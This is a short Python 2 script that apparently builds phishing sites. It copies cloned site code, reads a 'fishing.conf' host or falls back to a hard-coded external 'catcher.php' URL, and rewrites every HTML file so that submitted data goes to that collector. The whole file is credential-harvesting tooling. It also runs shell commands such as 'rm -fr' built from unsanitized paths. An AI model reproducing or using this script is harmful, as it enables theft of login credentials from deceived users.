from changer import ChangeHtml
import sys
from os import system
from os.path import abspath,basename,join,walk,dirname

#CurrentDirectory  = abspath (os.curdir)
CurrentDirectory  = dirname(abspath(sys.argv[0]))
SiteName          = basename(CurrentDirectory)
ProjectDirectory  = abspath(join(CurrentDirectory, "../../"))
ConfigFile        = join(ProjectDirectory, "fishing.conf")
NewSiteDirectory  = join(ProjectDirectory, "result", SiteName)
SiteCodeDirectory = join(CurrentDirectory + "/code")
Extension         = '.html'

system("mkdir -p " + ProjectDirectory + "/result")
system("rm -fr " + NewSiteDirectory)
system("cp -r " + SiteCodeDirectory + " " + NewSiteDirectory)

catcher = ""
f = open(ConfigFile,"r")
while(catcher == ""):
    l = f.readline()
    if l[0:5] == "Host=":
        catcher = l[5:-1] + "catcher.php"
    elif l == "":
        catcher = "http://flagruger.16mb.com/catcher.php"
f.close()

def step(ext, dirname, names):
    ExtFiles=[name for name in names if name.lower().endswith(ext.lower())]
    for name in ExtFiles:
        path = join(dirname,name)
        f = open(path,"r")
        html = f.read()
        f.close()

        html = ChangeHtml(html,catcher)

        f = open(path,"w")
        f.write(html)
        f.close()

walk(NewSiteDirectory, step, Extension)
